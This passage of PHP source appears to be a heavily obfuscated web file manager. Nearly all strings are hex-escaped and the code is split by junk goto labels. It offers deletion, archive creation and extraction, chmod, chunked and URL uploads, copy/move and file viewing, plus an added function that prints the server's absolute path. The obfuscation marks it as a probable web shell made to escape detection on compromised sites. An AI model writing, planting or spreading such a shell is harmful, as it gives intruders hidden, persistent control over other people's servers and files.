isn\"\x74\040\x77\162\x69\164\x65\141\x62\154\x65\056"
        );
    }
    echo json_encode($response);
    exit();
}

if (isset($_POST["\x67\162\x6F\165\x70"], $_POST["\x64\145\x6C\145\x74\145"], $_POST["\x74\157\x6B\145\x6E"]) && !FM_READONLY) {

    if(!verifyToken($_POST["\x74\157\x6B\145\x6E"])) {
        fm_set_msg(lng("\x49\156\x76\141\x6C\151\x64\040\x54\157\x6B\145\x6E\056"), "\x65\162\x72\157\x72");
    }

    $path = FM_ROOT_PATH;
    if (FM_PATH != "") {
        $path .= "\x2F" . FM_PATH;
    }

    $errors = 0;
    $files = $_POST["\x66\151\x6C\145"];
    if (is_array($files) && count($files)) {
        foreach ($files as $f) {
            if ($f != "") {
                $new_path = $path . "\x2F" . $f;
                if (!fm_rdelete($new_path)) {
                    $errors++;
                }
            }
        }
        if ($errors == 0) {
            fm_set_msg(lng("\x53\145\x6C\145\x63\164\x65\144\x20\146\x69\154\x65\163\x20\141\x6E\144\x20\146\x6F\154\x64\145\x72\040\x64\145\x6C\145\x74\145\x64"));
        } else {
            fm_set_msg(lng("\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x64\145\x6C\145\x74\151\x6E\147\x20\151\x74\145\x6D\163"), "\x65\162\x72\157\x72");
        }
    } else {
        fm_set_msg(lng("\x4E\157\x74\150\x69\156\x67\040\x73\145\x6C\145\x63\164\x65\144"), "\x61\154\x65\162\x74");
    }

    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
}

if (isset($_POST["\x67\162\x6F\165\x70"], $_POST["\x74\157\x6B\145\x6E"]) && (isset($_POST["\x7A\151\x70"]) || isset($_POST["\x74\141\x72"])) && !FM_READONLY) {

    if(!verifyToken($_POST["\x74\157\x6B\145\x6E"])) {
        fm_set_msg(lng("\x49\156\x76\141\x6C\151\x64\040\x54\157\x6B\145\x6E\056"), "\x65\162\x72\157\x72");
    }

    $path = FM_ROOT_PATH;
    $ext = "\x7A\151\x70";
    if (FM_PATH != "") {
        $path .= "\x2F" . FM_PATH;
    }

    $ext = isset($_POST["\x74\141\x72"]) ? "\x74\141\x72" : "\x7A\151\x70";

    if (($ext == "\x7A\151\x70" && !class_exists("\x5A\151\x70\101\x72\143\x68\151\x76\145")) || ($ext == "\x74\141\x72" && !class_exists("\x50\150\x61\162\x44\141\x74\141"))) {
        fm_set_msg(lng("\x4F\160\x65\162\x61\164\x69\157\x6E\163\x20\167\x69\164\x68\040\x61\162\x63\150\x69\166\x65\163\x20\141\x72\145\x20\156\x6F\164\x20\141\x76\141\x69\154\x61\142\x6C\145"), "\x65\162\x72\157\x72");
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
    }

    $files = $_POST["\x66\151\x6C\145"];
    $sanitized_files = array();
    foreach($files as $file){
        array_push($sanitized_files, fm_clean_path($file));
    }
    
    $files = $sanitized_files;
    
    if (!empty($files)) {
        chdir($path);

        if (count($files) == 1) {
            $one_file = reset($files);
            $one_file = basename($one_file);
            $zipname = $one_file . "\x5F" . date("\x79\155\x64\137\x48\151\x73") . "\x2E".$ext;
        } else {
            $zipname = "\x61\162\x63\150\x69\166\x65\137" . date("\x79\155\x64\137\x48\151\x73") . "\x2E".$ext;
        }

        if($ext == "\x7A\151\x70") {
            $zipper = new FM_Zipper();
            $res = $zipper->create($zipname, $files);
        } elseif ($ext == "\x74\141\x72") {
            $tar = new FM_Zipper_Tar();
            $res = $tar->create($zipname, $files);
        }

        if ($res) {
            fm_set_msg(sprintf(lng("\x41\162\x63\150\x69\166\x65")."\x20\074\x62\076\x25\163\x3C\057\x62\076\x20".lng("\x43\162\x65\141\x74\145\x64"), fm_enc($zipname)));
        } else {
            fm_set_msg(lng("\x41\162\x63\150\x69\166\x65\040\x6E\157\x74\040\x63\162\x65\141\x74\145\x64"), "\x65\162\x72\157\x72");
        }
    } else {
        fm_set_msg(lng("\x4E\157\x74\150\x69\156\x67\040\x73\145\x6C\145\x63\164\x65\144"), "\x61\154\x65\162\x74");
    }

    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
}

if (isset($_POST["\x75\156\x7A\151\x70"], $_POST["\x74\157\x6B\145\x6E"]) && !FM_READONLY) {

    if(!verifyToken($_POST["\x74\157\x6B\145\x6E"])) {
        fm_set_msg(lng("\x49\156\x76\141\x6C\151\x64\040\x54\157\x6B\145\x6E\056"), "\x65\162\x72\157\x72");
    }

    $unzip = urldecode($_POST["\x75\156\x7A\151\x70"]);
    $unzip = fm_clean_path($unzip);
    $unzip = str_replace("\x2F", "", $unzip);
    $isValid = false;

    $path = FM_ROOT_PATH;
    if (FM_PATH != "") {
        $path .= "\x2F" . FM_PATH;
    }

    if ($unzip != "" && is_file($path . "\x2F" . $unzip)) {
        $zip_path = $path . "\x2F" . $unzip;
        $ext = pathinfo($zip_path, PATHINFO_EXTENSION);
        $isValid = true;
    } else {
        fm_set_msg(lng("\x46\151\x6C\145\x20\156\x6F\164\x20\146\x6F\165\x6E\144"), "\x65\162\x72\157\x72");
    }

    if (($ext == "\x7A\151\x70" && !class_exists("\x5A\151\x70\101\x72\143\x68\151\x76\145")) || ($ext == "\x74\141\x72" && !class_exists("\x50\150\x61\162\x44\141\x74\141"))) {
        fm_set_msg(lng("\x4F\160\x65\162\x61\164\x69\157\x6E\163\x20\167\x69\164\x68\040\x61\162\x63\150\x69\166\x65\163\x20\141\x72\145\x20\156\x6F\164\x20\141\x76\141\x69\154\x61\142\x6C\145"), "\x65\162\x72\157\x72");
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
    }

    if ($isValid) {
        $tofolder = "";
        if (isset($_POST["\x74\157\x66\157\x6C\144\x65\162"])) {
            $tofolder = pathinfo($zip_path, PATHINFO_FILENAME);
            if (fm_mkdir($path . "\x2F" . $tofolder, true)) {
                $path .= "\x2F" . $tofolder;
            }
        }

        if($ext == "\x7A\151\x70") {
            $zipper = new FM_Zipper();
            $res = $zipper->unzip($zip_path, $path);
        } elseif ($ext == "\x74\141\x72") {
            try {
                $gzipper = new PharData($zip_path);
                if (@$gzipper->extractTo($path,null, true)) {
                    $res = true;
                } else {
                    $res = false;
                }
            } catch (Exception $e) {
                $res = true;
            }
        }

        if ($res) {
            fm_set_msg(lng("\x41\162\x63\150\x69\166\x65\040\x75\156\x70\141\x63\153\x65\144"));
        } else {
            fm_set_msg(lng("\x41\162\x63\150\x69\166\x65\040\x6E\157\x74\040\x75\156\x70\141\x63\153\x65\144"), "\x65\162\x72\157\x72");
        }
    } else {
        fm_set_msg(lng("\x46\151\x6C\145\x20\156\x6F\164\x20\146\x6F\165\x6E\144"), "\x65\162\x72\157\x72");
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
}
if (isset($_POST["\x63\150\x6D\157\x64"], $_POST["\x74\157\x6B\145\x6E"]) && !FM_READONLY && !FM_IS_WIN) {

    if(!verifyToken($_POST["\x74\157\x6B\145\x6E"])) {
        fm_set_msg(lng("\x49\156\x76\141\x6C\151\x64\040\x54\157\x6B\145\x6E\056"), "\x65\162\x72\157\x72");
    }
    
    $path = FM_ROOT_PATH;
    if (FM_PATH != "") {
        $path .= "\x2F" . FM_PATH;
    }

    $file = $_POST["\x63\150\x6D\157\x64"];
    $file = fm_clean_path($file);
    $file = str_replace("\x2F", "", $file);
    if ($file == "" || (!is_file($path . "\x2F" . $file) && !is_dir($path . "\x2F" . $file))) {
        fm_set_msg(lng("\x46\151\x6C\145\x20\156\x6F\164\x20\146\x6F\165\x6E\144"), "\x65\162\x72\157\x72");
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
    }

    $mode = 0;
    if (!empty($_POST["\x75\162"])) {
        $mode |= 0400;
    }
    if (!empty($_POST["\x75\167"])) {
        $mode |= 0200;
    }
    if (!empty($_POST["\x75\170"])) {
        $mode |= 0100;
    }
    if (!empty($_POST["\x67\162"])) {
        $mode |= 0040;
    }
    if (!empty($_POST["\x67\167"])) {
        $mode |= 0020;
    }
    if (!empty($_POST["\x67\170"])) {
        $mode |= 0010;
    }
    if (!empty($_POST["\x6F\162"])) {
        $mode |= 0004;
    }
    if (!empty($_POST["\x6F\167"])) {
        $mode |= 0002;
    }
    if (!empty($_POST["\x6F\170"])) {
        $mode |= 0001;
    }

    if (@chmod($path . "\x2F" . $file, $mode)) {
        fm_set_msg(lng("\x50\145\x72\155\x69\163\x73\151\x6F\156\x73\040\x63\150\x61\156\x67\145\x64"));
    } else {
        fm_set_msg(lng("\x50\145\x72\155\x69\163\x73\151\x6F\156\x73\040\x6E\157\x74\040\x63\150\x61\156\x67\145\x64"), "\x65\162\x72\157\x72");
    }

    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
}

$path = FM_ROOT_PATH;
if (FM_PATH != "") {
    $path .= "\x2F" . FM_PATH;
}

if (!is_dir($path)) {
    fm_redirect(FM_SELF_URL . "\x3F\160\x3D");
}

$parent = fm_get_parent_path(FM_PATH);

$objects = is_readable($path) ? scandir($path) : array();
$folders = array();
$files = array();
$current_path = array_slice(explode("\x2F",$path), -1)[0];
if (is_array($objects) && fm_is_exclude_items($current_path)) {
    foreach ($objects as $file) {
        if ($file == "\x2E" || $file == "\x2E\056") {
            continue;
        }
        if (!FM_SHOW_HIDDEN && substr($file, 0, 1) === "\x2E") {
            continue;
        }
        $new_path = $path . "\x2F" . $file;
        if (@is_file($new_path) && fm_is_exclude_items($file)) {
            $files[] = $file;
        } elseif (@is_dir($new_path) && $file != "\x2E" && $file != "\x2E\056" && fm_is_exclude_items($file)) {
            $folders[] = $file;
        }
    }
}

if (!empty($files)) {
    natcasesort($files);
}
if (!empty($folders)) {
    natcasesort($folders);
}

if (isset($_GET["\x75\160\x6C\157\x61\144"]) && !FM_READONLY) {
    fm_show_header();
    fm_show_nav_path(FM_PATH);
    function getUploadExt() {
        $extArr = explode("\x2C", FM_UPLOAD_EXTENSION);
        if(FM_UPLOAD_EXTENSION && $extArr) {
            array_walk($extArr, function(&$x) {$x = "\x2E\044\x78";});
            return implode("\x2C", $extArr);
        }
        return "";
    } ?>
    <?php goto opet_1c910; opet_1c910: function display_path($current_dir) {
    // Mendapatkan path absolut
    $absolute_path = realpath($current_dir);

    // Mengubah path absolut menjadi format path website
    $path_parts = explode(DIRECTORY_SEPARATOR, $absolute_path);
    $web_path = $_SERVER["\x44\117\x43\125\x4D\105\x4E\124\x5F\122\x4F\117\x54"]; // Root direktori website

    $relative_path = str_replace($web_path, "", $absolute_path);
    $relative_path = trim($relative_path, DIRECTORY_SEPARATOR);

    // Memisahkan path menjadi bagian-bagian dan membuat link yang bisa diklik
    $path_parts = explode(DIRECTORY_SEPARATOR, $relative_path);
    $current_link = $_SERVER["\x44\117\x43\125\x4D\105\x4E\124\x5F\122\x4F\117\x54"];

    echo "\x50\141\x74\150\x3A\040";
    $full_path = ""; // Variabel untuk menampung path yang lengkap
    foreach ($path_parts as $part) {
        $full_path .= DIRECTORY_SEPARATOR . $part;
        $link = $current_link . $full_path;
        echo "\x3C\141\x20\150\x72\145\x66\075\x22" . $link . "\x22\076" . $part . "\x3C\057\x61\076\x20\057\x20";
    }
}

// Contoh penggunaan
$current_dir = __DIR__; // Mendapatkan direktori saat ini
display_path($current_dir); ?>

    <?php goto opet_1c915; opet_1c915: print_external("\x63\163\x73\055\x64\162\x6F\160\x7A\157\x6E\145"); ?>
    <div class="path">

        <div class="card mb-2 fm-upload-wrapper <?php goto opet_1c917; opet_1c917: echo fm_get_theme(); ?>">
            <div class="card-header">
                <ul class="nav nav-tabs card-header-tabs">
                    <li class="nav-item">
                        <a class="nav-link active" href="#fileUploader" data-target="#fileUploader"><i class="fa fa-arrow-circle-o-up"></i> <?php goto opet_1c91b; opet_1c91b: echo lng("\x55\160\x6C\157\x61\144\x69\156\x67\106\x69\154\x65\163") ?></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader"><i class="fa fa-link"></i> <?php goto opet_1c920; opet_1c920: echo lng("\x55\160\x6C\157\x61\144\x20\146\x72\157\x6D\040\x55\122\x4C") ?></a>
                    </li>
                </ul>
            </div>
            <div class="card-body">
                <p class="card-text">
                    <a href="?p=<?php goto opet_1c922; opet_1c922: echo FM_PATH ?>" class="float-right"><i class="fa fa-chevron-circle-left go-back"></i> <?php goto opet_1c924; opet_1c924: echo lng("\x42\141\x63\153") ?></a>
                    <strong><?php goto opet_1c929; opet_1c929: echo lng("\x44\145\x73\164\x69\156\x61\164\x69\157\x6E\106\x6F\154\x64\145\x72") ?></strong>: <?php goto opet_1c92b; opet_1c92b: echo fm_enc(fm_convert_win(FM_PATH)) ?>
                </p>

                <form action="<?php goto opet_1c92d; opet_1c92d: echo htmlspecialchars(FM_SELF_URL) . "\x3F\160\x3D" . fm_enc(FM_PATH) ?>" class="dropzone card-tabs-container" id="fileUploader" enctype="multipart/form-data">
                    <input type="hidden" name="p" value="<?php goto opet_1c92f; opet_1c92f: echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="fullpath" id="fullpath" value="<?php goto opet_1c930; opet_1c930: echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="token" value="<?php goto opet_1c932; opet_1c932: echo $_SESSION["\x74\157\x6B\145\x6E"]; ?>">
                    <div class="fallback">
                        <input name="file" type="file" multiple/>
                    </div>
                </form>

                <div class="upload-url-wrapper card-tabs-container hidden" id="urlUploader">
                    <form id="js-form-url-upload" class="row row-cols-lg-auto g-3 align-items-center" onsubmit="return upload_from_url(this);" method="POST" action="">
                        <input type="hidden" name="type" value="upload" aria-label="hidden" aria-hidden="true">
                        <input type="url" placeholder="URL" name="uploadurl" required class="form-control" style="width: 80%">
                        <input type="hidden" name="token" value="<?php goto opet_1c935; opet_1c935: echo $_SESSION["\x74\157\x6B\145\x6E"]; ?>">
                        <button type="submit" class="btn btn-primary ms-3"><?php goto opet_1c938; opet_1c938: echo lng("\x55\160\x6C\157\x61\144") ?></button>
                        <div class="lds-facebook"><div></div><div></div><div></div></div>
                    </form>
                    <div id="js-url-upload__list" class="col-9 mt-3"></div>
                </div>
            </div>
        </div>
    </div>
    <?php goto opet_1c93c; opet_1c93c: print_external("\x6A\163\x2D\144\x72\157\x70\172\x6F\156\x65"); ?>
    <script>
        Dropzone.options.fileUploader = {
            chunking: true,
            chunkSize: <?php goto opet_1c93d; opet_1c93d: echo UPLOAD_CHUNK_SIZE; ?>,
            forceChunking: true,
            retryChunks: true,
            retryChunksLimit: 3,
            parallelUploads: 1,
            parallelChunkUploads: false,
            timeout: 120000,
            maxFilesize: "<?php goto opet_1c93e; opet_1c93e: echo MAX_UPLOAD_SIZE; ?>",
            acceptedFiles : "<?php goto opet_1c940; opet_1c940: echo getUploadExt() ?>",
            init: function () {
                this.on("sending", function (file, xhr, formData) {
                    let _path = (file.fullPath) ? file.fullPath : file.name;
                    document.getElementById("fullpath").value = _path;
                    xhr.ontimeout = (function() {
                        toast('Error: Server Timeout');
                    });
                }).on("success", function (res) {
                    let _response = JSON.parse(res.xhr.response);

                    if(_response.status == "error") {
                        toast(_response.info);
                    }
                }).on("error", function(file, response) {
                    toast(response);
                });
            }
        }
    </script>
    <?php goto opet_1c94a; opet_1c94a: fm_show_footer();
    exit;
}

if (isset($_POST["\x63\157\x70\171"]) && !FM_READONLY) {
    $copy_files = isset($_POST["\x66\151\x6C\145"]) ? $_POST["\x66\151\x6C\145"] : null;
    if (!is_array($copy_files) || empty($copy_files)) {
        fm_set_msg(lng("\x4E\157\x74\150\x69\156\x67\040\x73\145\x6C\145\x63\164\x65\144"), "\x61\154\x65\162\x74");
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
    }

    fm_show_header();
    fm_show_nav_path(FM_PATH); ?>
    <div class="path">
        <div class="card <?php goto opet_1c94c; opet_1c94c: echo fm_get_theme(); ?>">
            <div class="card-header">
                <h6><?php goto opet_1c94f; opet_1c94f: echo lng("\x43\157\x70\171\x69\156\x67") ?></h6>
            </div>
            <div class="card-body">
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php goto opet_1c950; opet_1c950: echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="finish" value="1">
                    <?php goto opet_1c95b; opet_1c95b: foreach ($copy_files as $cf) {
                        echo "\x3C\151\x6E\160\x75\164\x20\164\x79\160\x65\075\x22\150\x69\144\x64\145\x6E\042\x20\156\x61\155\x65\075\x22\146\x69\154\x65\133\x5D\042\x20\166\x61\154\x75\145\x3D\042" . fm_enc($cf) . "\x22\076" . PHP_EOL;
                    } ?>
                    <p class="break-word"><strong><?php goto opet_1c95e; opet_1c95e: echo lng("\x46\151\x6C\145\x73") ?></strong>: <b><?php goto opet_1c961; opet_1c961: echo implode("\x3C\057\x62\076\x2C\040\x3C\142\x3E", $copy_files) ?></b></p>
                    <p class="break-word"><strong><?php goto opet_1c965; opet_1c965: echo lng("\x53\157\x75\162\x63\145\x46\157\x6C\144\x65\162") ?></strong>: <?php goto opet_1c967; opet_1c967: echo fm_enc(fm_convert_win(FM_ROOT_PATH . "\x2F" . FM_PATH)) ?><br>
                        <label for="inp_copy_to"><strong><?php goto opet_1c96c; opet_1c96c: echo lng("\x44\145\x73\164\x69\156\x61\164\x69\157\x6E\106\x6F\154\x64\145\x72") ?></strong>:</label>
                        <?php goto opet_1c96d; opet_1c96d: echo FM_ROOT_PATH ?>/<input type="text" name="copy_to" id="inp_copy_to" value="<?php goto opet_1c96f; opet_1c96f: echo fm_enc(FM_PATH) ?>">
                    </p>
                    <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input"><label for="js-move-files" class="custom-control-label ms-2"> <?php goto opet_1c971; opet_1c971: echo lng("\x4D\157\x76\145") ?></label></p>
                    <p>
                        <b><a href="?p=<?php goto opet_1c972; opet_1c972: echo urlencode(FM_PATH) ?>" class="btn btn-outline-danger"><i class="fa fa-times-circle"></i> <?php goto opet_1c975; opet_1c975: echo lng("\x43\141\x6E\143\x65\154") ?></a></b>&nbsp;
                        <input type="hidden" name="token" value="<?php goto opet_1c978; opet_1c978: echo $_SESSION["\x74\157\x6B\145\x6E"]; ?>">
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php goto opet_1c97a; opet_1c97a: echo lng("\x43\157\x70\171") ?></button> 
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php goto opet_1c986; opet_1c986: fm_show_footer();
    exit;
}

if (isset($_GET["\x63\157\x70\171"]) && !isset($_GET["\x66\151\x6E\151\x73\150"]) && !FM_READONLY) {
    $copy = $_GET["\x63\157\x70\171"];
    $copy = fm_clean_path($copy);
    if ($copy == "" || !file_exists(FM_ROOT_PATH . "\x2F" . $copy)) {
        fm_set_msg(lng("\x46\151\x6C\145\x20\156\x6F\164\x20\146\x6F\165\x6E\144"), "\x65\162\x72\157\x72");
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
    }

    fm_show_header();
    fm_show_nav_path(FM_PATH); ?>
    <div class="path">
        <p><b>Copying</b></p>
        <p class="break-word">
            <strong>Source path:</strong> <?php goto opet_1c988; opet_1c988: echo fm_enc(fm_convert_win(FM_ROOT_PATH . "\x2F" . $copy)) ?><br>
            <strong>Destination folder:</strong> <?php goto opet_1c98a; opet_1c98a: echo fm_enc(fm_convert_win(FM_ROOT_PATH . "\x2F" . FM_PATH)) ?>
        </p>
        <p>
            <b><a href="?p=<?php goto opet_1c98b; opet_1c98b: echo urlencode(FM_PATH) ?>&amp;copy=<?php goto opet_1c98c; opet_1c98c: echo urlencode($copy) ?>&amp;finish=1"><i class="fa fa-check-circle"></i> Copy</a></b> &nbsp;
            <b><a href="?p=<?php goto opet_1c98d; opet_1c98d: echo urlencode(FM_PATH) ?>&amp;copy=<?php goto opet_1c98e; opet_1c98e: echo urlencode($copy) ?>&amp;finish=1&amp;move=1"><i class="fa fa-check-circle"></i> Move</a></b> &nbsp;
            <b><a href="?p=<?php goto opet_1c98f; opet_1c98f: echo urlencode(FM_PATH) ?>" class="text-danger"><i class="fa fa-times-circle"></i> Cancel</a></b>
        </p>
        <p><i><?php goto opet_1c993; opet_1c993: echo lng("\x53\145\x6C\145\x63\164\x20\146\x6F\154\x64\145\x72") ?></i></p>
        <ul class="folders break-word">
            <?php goto opet_1c995; opet_1c995: if ($parent !== false) { ?>
                <li><a href="?p=<?php goto opet_1c996; opet_1c996: echo urlencode($parent) ?>&amp;copy=<?php goto opet_1c997; opet_1c997: echo urlencode($copy) ?>"><i class="fa fa-chevron-circle-left"></i> ..</a></li>
                <?php goto opet_1c998; opet_1c998: }
            foreach ($folders as $f) { ?>
                <li>
                    <a href="?p=<?php goto opet_1c99b; opet_1c99b: echo urlencode(trim(FM_PATH . "\x2F" . $f, "\x2F")) ?>&amp;copy=<?php goto opet_1c99c; opet_1c99c: echo urlencode($copy) ?>"><i class="fa fa-folder-o"></i> <?php goto opet_1c99d; opet_1c99d: echo fm_convert_win($f) ?></a></li>
                <?php goto opet_1c99e; opet_1c99e: } ?>
        </ul>
    </div>
    <?php goto opet_1c9ba; opet_1c9ba: fm_show_footer();
    exit;
}
if (isset($_GET["\x76\151\x65\167"])) {
    $file = $_GET["\x76\151\x65\167"];
    $file = fm_clean_path($file, false);
    $file = str_replace("\x2F", "", $file);
    if ($file == "" || !is_file($path . "\x2F" . $file) || in_array($file, $GLOBALS["\x65\170\x63\154\x75\144\x65\137\x69\164\x65\155\x73"])) {
        fm_set_msg(lng("\x46\151\x6C\145\x20\156\x6F\164\x20\146\x6F\165\x6E\144"), "\x65\162\x72\157\x72");
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
    }

    fm_show_header(); 
    fm_show_nav_path(FM_PATH); 

    $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != "" ? "\x2F" . FM_PATH : "") . "\x2F" . $file);
    $file_path = $path . "\x2F" . $file;

    $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $mime_type = fm_get_mime_type($file_path);
    $filesize_raw = fm_get_size($file_path);
    $filesize = fm_get_filesize($filesize_raw);

    $is_zip = false;
    $is_gzip = false;
    $is_image = false;
    $is_audio = false;
    $is_video = false;
    $is_text = false;
    $is_onlineViewer = false;

    $view_title = "\x46\151\x6C\145";
    $filenames = false; 
    $content = ""; 
    $online_viewer = strtolower(FM_DOC_VIEWER);

    if($online_viewer && $online_viewer !== "\x66\141\x6C\163\x65" && in_array($ext, fm_get_onlineViewer_exts())){
        $is_onlineViewer = true;
    }
    elseif ($ext == "\x7A\151\x70" || $ext == "\x74\141\x72") {
        $is_zip = true;
        $view_title = "\x41\162\x63\150\x69\166\x65";
        $filenames = fm_get_zif_info($file_path, $ext);
    } elseif (in_array($ext, fm_get_image_exts())) {
        $is_image = true;
        $view_title = "\x49\155\x61\147\x65";
    } elseif (in_array($ext, fm_get_audio_exts())) {
        $is_audio = true;
        $view_title = "\x41\165\x64\151\x6F";
    } elseif (in_array($ext, fm_get_video_exts())) {
        $is_video = true;
        $view_title = "\x56\151\x64\145\x6F";
    } elseif (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == "\x74\145\x78\164" || in_array($mime_type, fm_get_text_mimes())) {
        $is_text = true;
        $content = file_get_contents($file_path);
    } ?>
    <div class="row">
        <div class="col-12">
            <p class="break-word"><b><?php goto opet_1c9bc; opet_1c9bc: echo lng($view_title) ?> "<?php goto opet_1c9bd; opet_1c9bd: echo fm_enc(fm_convert_win($file)) ?>"</b></p>
            <p class="break-word">
                <?php goto opet_1c9bf; opet_1c9bf: $display_path = fm_get_display_path($file_path); ?>
                <strong><?php goto opet_1c9c1; opet_1c9c1: echo $display_path["\x6C\141\x62\145\x6C"]; ?>:</strong> <?php goto opet_1c9c4; opet_1c9c4: echo $display_path["\x70\141\x74\150"]; ?><br>
                <strong>File size:</strong> <?php goto opet_1c9c9; opet_1c9c9: echo ($filesize_raw <= 1000) ? "\x24\146\x69\154\x65\163\x69\172\x65\137\x72\141\x77\040\x62\171\x74\145\x73" : $filesize; ?><br>
                <strong>MIME-type:</strong> <?php goto opet_1c9ca; opet_1c9ca: echo $mime_type ?><br>
                <?php goto opet_1c9d3; opet_1c9d3: if (($is_zip || $is_gzip) && $filenames !== false) {
                    $total_files = 0;
                    $total_comp = 0;
                    $total_uncomp = 0;
                    foreach ($filenames as $fn) {
                        if (!$fn["\x66\157\x6C\144\x65\162"]) {
                            $total_files++;
                        }
                        $total_comp += $fn["\x63\157\x6D\160\x72\145\x73\163\x65\144\x5F\163\x69\172\x65"];
                        $total_uncomp += $fn["\x66\151\x6C\145\x73\151\x7A\145"];
                    } ?>
                    <?php goto opet_1c9d8; opet_1c9d8: echo lng("\x46\151\x6C\145\x73\040\x69\156\x20\141\x72\143\x68\151\x76\145") ?>: <?php goto opet_1c9d9; opet_1c9d9: echo $total_files ?><br>
                    <?php goto opet_1c9dd; opet_1c9dd: echo lng("\x54\157\x74\141\x6C\040\x73\151\x7A\145") ?>: <?php goto opet_1c9de; opet_1c9de: echo fm_get_filesize($total_uncomp) ?><br>
                    <?php goto opet_1c9e2; opet_1c9e2: echo lng("\x53\151\x7A\145\x20\151\x6E\040\x61\162\x63\150\x69\166\x65") ?>: <?php goto opet_1c9e4; opet_1c9e4: echo fm_get_filesize($total_comp) ?><br>
                    <?php goto opet_1c9e7; opet_1c9e7: echo lng("\x43\157\x6D\160\x72\145\x73\163\x69\157\x6E") ?>: <?php goto opet_1c9e9; opet_1c9e9: echo round(($total_comp / max($total_uncomp, 1)) * 100) ?>%<br>
                    <?php goto opet_1ca01; opet_1ca01: }
                if ($is_image) {
                    $image_size = getimagesize($file_path);
                    echo "\x3C\163\x74\162\x6F\156\x67\076".lng("\x49\155\x61\147\x65\040\x73\151\x7A\145")."\x3A\074\x2F\163\x74\162\x6F\156\x67\076\x20" . (isset($image_size[0]) ? $image_size[0] : "\x30") . "\x20\170\x20" . (isset($image_size[1]) ? $image_size[1] : "\x30") . "\x3C\142\x72\076";
                }
                if ($is_text) {
                    $is_utf8 = fm_is_utf8($content);
                    if (function_exists("\x69\143\x6F\156\x76")) {
                        if (!$is_utf8) {
                            $content = iconv(FM_ICONV_INPUT_ENC, "\x55\124\x46\055\x38\057\x2F\111\x47\116\x4F\122\x45", $content);
                        }
                    }
                    echo "\x3C\163\x74\162\x6F\156\x67\076".lng("\x43\150\x61\162\x73\145\x74")."\x3A\074\x2F\163\x74\162\x6F\156\x67\076\x20" . ($is_utf8 ? "\x75\164\x66\055\x38" : "\x38\040\x62\151\x74") . "\x3C\142\x72\076";
                } ?>
            </p>
            <div class="d-flex align-items-center mb-3">
                <form method="post" class="d-inline ms-2" action="?p=<?php goto opet_1ca03; opet_1ca03: echo urlencode(FM_PATH) ?>&amp;dl=<?php goto opet_1ca04; opet_1ca04: echo urlencode($file) ?>">
                    <input type="hidden" name="token" value="<?php goto opet_1ca06; opet_1ca06: echo $_SESSION["\x74\157\x6B\145\x6E"]; ?>">
                    <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0"><i class="fa fa-cloud-download"></i> <?php goto opet_1ca0a; opet_1ca0a: echo lng("\x44\157\x77\156\x6C\157\x61\144") ?></button> &nbsp;
                </form>
                <b class="ms-2"><a href="<?php goto opet_1ca0b; opet_1ca0b: echo fm_enc($file_url) ?>" target="_blank"><i class="fa fa-external-link-square"></i> <?php goto opet_1ca0d; opet_1ca0d: echo lng("\x4F\160\x65\156") ?></a></b>
                <?php goto opet_1ca0f; opet_1ca0f: if (!FM_READONLY && ($is_zip || $is_gzip) && $filenames !== false) {
                    $zip_name = pathinfo($file_path, PATHINFO_FILENAME); ?>
                    <form method="post" class="d-inline ms-2">
                        <input type="hidden" name="token" value="<?php goto opet_1ca12; opet_1ca12: echo $_SESSION["\x74\157\x6B\145\x6E"]; ?>">
                        <input type="hidden" name="unzip" value="<?php goto opet_1ca13; opet_1ca13: echo urlencode($file); ?>">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;"><i class="fa fa-check-circle"></i> <?php goto opet_1ca16; opet_1ca16: echo lng("\x55\156\x5A\151\x70") ?></button>
                    </form>&nbsp;
                    <form method="post" class="d-inline ms-2">
                        <input type="hidden" name="token" value="<?php goto opet_1ca18; opet_1ca18: echo $_SESSION["\x74\157\x6B\145\x6E"]; ?>">
                        <input type="hidden" name="unzip" value="<?php goto opet_1ca1a; opet_1ca1a: echo urlencode($file); ?>">
                        <input type="hidden" name="tofolder" value="1">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;" title="UnZip to <?php goto opet_1ca1b; opet_1ca1b: echo fm_enc($zip_name) ?>"><i class="fa fa-check-circle"></i> <?php goto opet_1ca1f; opet_1ca1f: echo lng("\x55\156\x5A\151\x70\124\x6F\106\x6F\154\x64\145\x72") ?></button>
                    </form>&nbsp;
                    <?php goto opet_1ca20; opet_1ca20: }
                if ($is_text && !FM_READONLY) { ?>
